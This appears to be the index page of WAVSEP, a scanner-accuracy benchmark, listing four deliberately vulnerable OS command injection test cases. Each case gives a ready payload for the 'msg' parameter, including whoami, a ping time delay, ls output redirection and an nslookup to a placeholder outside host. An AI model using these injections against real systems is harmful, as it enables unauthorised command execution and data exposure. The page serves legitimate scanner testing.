<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Evaluation of OS Command Injection Detection Accuracy - HTTP GET Method Responses</title>
</head>
<body>

<center><font size="5">Injection Test Cases - HTTP GET Method Responses:</font></center><br><br>
<B><a href="Case01-Command-Injection-SimpleCase.jsp?msg=textvalue&image=/wavsep/images/wavsep-logo.jpeg">Case01-Command-Injection-SimpleCase.jsp</a></B><br>
  Injection into GET parameter to trigger changes in responses to infer information.<br>
  Goal: execute the 'whoami' command to determine the name of the current user.<br>
  <U>Barriers:</U><br>
   None <br>
  <U>Exploit:</U> <B>1|whoami</B> in 'msg' GET param<br><br>
  
<B><a href="Case02-Command-Injection-Blind-TimeDelay.jsp?msg=textvalue&image=/wavsep/images/wavsep-logo.jpeg">Case02-Command-Injection-Blind-TimeDelay.jsp</a></B><br>
   Injection into GET parameter to trigger changes in responses to infer information.<br>
  Goal: exploit the blind OS command injection vulnerability to cause a 10 second delay.<br>
  <U>Barriers:</U><br>
   None <br>
  <U>Exploit:</U> <B>x|ping+-c+10+127.0.0.1</B> in 'msg' GET param<br><br>
  
  <B><a href="Case03-Command-injection-Blind-OutputRedirection.jsp?msg=textvalue&image=/wavsep/images/wavsep-logo.jpeg">Case03-Command-injection-Blind-OutputRedirection.jsp</a></B><br>
  Injection into search parameter to execute a command.<br>
  Goal: redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.<br>
    <U>Barriers:</U><br>
   None <br>
  <U>Exploit:</U><br>
    <B>(1) Listing contents of directory</B><br>
     Inject <B>1|ls>images/output.txt</B> in 'msg' GET param.<br><br>
    <B>(2)Retrieve output of the injected command</B><br>
    Retrieve contents injecting <B>?image=/wavsep/images/output.txt</B> in GET parameter 'image'.<br>
    it is not an image, so it will be a broken document logo, but the injection was successful.<br>
    To view the result, right click in the box -> view image;<br>
    here is the result of the output.txt file<br><br>
    
<B><a href="Case04-Command-injection-Blind-OutOfBand.jsp?msg=textvalue&image=/wavsep/images/wavsep-logo.jpeg">Case04-Command-injection-Blind-OutOfBand.jsp</a></B><br>
   Injection into GET parameter to trigger changes in responses to infer information.<br>
  Goal: trigger out-of-band interactions with an external domain.<br>
  <U>Barriers:</U><br>
   None <br>
  <U>Exploit:</U> <B>x|nslookup+x.yourserveraddress.com</B> in 'msg' GET param<br><br>
</body>
</html>